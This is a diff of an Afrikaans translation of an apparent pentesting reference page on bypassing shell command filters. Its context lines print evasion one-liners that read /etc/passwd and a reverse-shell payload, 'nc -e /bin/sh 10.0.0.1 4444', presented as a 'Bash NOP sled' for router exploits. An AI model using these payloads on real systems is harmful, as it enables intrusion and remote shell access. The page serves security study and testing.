@@ -78,7 +78,7 @@ mi # This will throw an error
 whoa # This will throw an error
 !-1!-2 # This will execute whoami
 ```
-### Om verbode spasie te omseil
+### Om te verbygaan verbode spasie
 ```bash
 # {form}
 {cat,lol.txt} # cat lol.txt
@@ -114,7 +114,7 @@ cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
-### Bypass met hex kodering
+### Bypass met hex-kodering
 ```bash
 echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
 cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
@@ -294,9 +294,9 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Lees-Alleen/Geen Exec/Distroless Bypass
+## Lees-Alleen/Geen Uitvoering/Distroless Bypass
 
-As jy binne 'n lêerstelsel is met die **lees-alleen en geen exec beskermings** of selfs in 'n distroless houer, is daar steeds maniere om **arbitraire binaries uit te voer, selfs 'n shell!:**
+As jy binne 'n lêerstelsel is met die **lees-alleen en geen uitvoering beskerming** of selfs in 'n distroless houer, is daar steeds maniere om **arbitraire binêre lêers uit te voer, selfs 'n shell!:**
 
 {{#ref}}
 bypass-fs-protections-read-only-no-exec-distroless/
@@ -310,15 +310,15 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Ruimte-gebaseerde Bash NOP Sled ("Bashsledding")
 
-Wanneer 'n kwesbaarheid jou toelaat om gedeeltelik 'n argument te beheer wat uiteindelik `system()` of 'n ander shell bereik, mag jy nie die presiese offset weet waar uitvoering begin om jou payload te lees nie. Tradisionele NOP sleds (bv. `\x90`) werk **nie** in shell-sintaksis nie, maar Bash sal onskadelik lei spasie voor die uitvoering van 'n opdrag ignoreer.
+Wanneer 'n kwesbaarheid jou toelaat om gedeeltelik 'n argument te beheer wat uiteindelik `system()` of 'n ander shell bereik, mag jy nie die presiese offset weet waar uitvoering begin om jou payload te lees nie. Tradisionele NOP sleds (bv. `\x90`) werk **nie** in shell-sintaksis nie, maar Bash sal onskadelik lei spasiëring voor die uitvoering van 'n opdrag ignoreer.
 
-Daarom kan jy 'n *NOP sled vir Bash* skep deur jou werklike opdrag te prefix met 'n lang reeks spasië of tab karakters:
+Daarom kan jy 'n *NOP sled vir Bash* skep deur jou werklike opdrag te prefix met 'n lang reeks spasie of tab karakters:
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
 # 16× spaces ───┘ ↑ real command
 ```
-As 'n ROP-ketting (of enige geheue-korrosie-primitief) die instruksie-aanwyser enige plek binne die ruimteblok land, sal die Bash-parsser eenvoudig die spasie oorslaan totdat dit by `nc` kom, wat jou opdrag betroubaar uitvoer.
+As 'n ROP-ketting (of enige geheue-korrupsie-primitief) die instruksie-aanwyser enige plek binne die ruimteblok land, sal die Bash-pars eenvoudig die spasie oorslaan totdat dit by `nc` kom, wat jou opdrag betroubaar uitvoer.
 
 Praktiese gebruiksgevalle:
 
@@ -326,14 +326,14 @@ Praktiese gebruiksgevalle:
 2. Situasies waar die aanvaller nie NULL-byte kan skryf om die payload te belyn nie.
 3. Ingebedde toestelle waar slegs BusyBox `ash`/`sh` beskikbaar is – hulle ignoreer ook lei-spasies.
 
-> 🛠️  Kombineer hierdie truuk met ROP gadgets wat `system()` aanroep om die ontploffingsbetroubaarheid op geheue-beperkte IoT-roeters dramaties te verhoog.
+> 🛠️  Kombineer hierdie truuk met ROP gadgets wat `system()` aanroep om die eksploit se betroubaarheid op geheue-beperkte IoT-roeters dramaties te verhoog.
 
 ## Verwysings & Meer
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
 
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
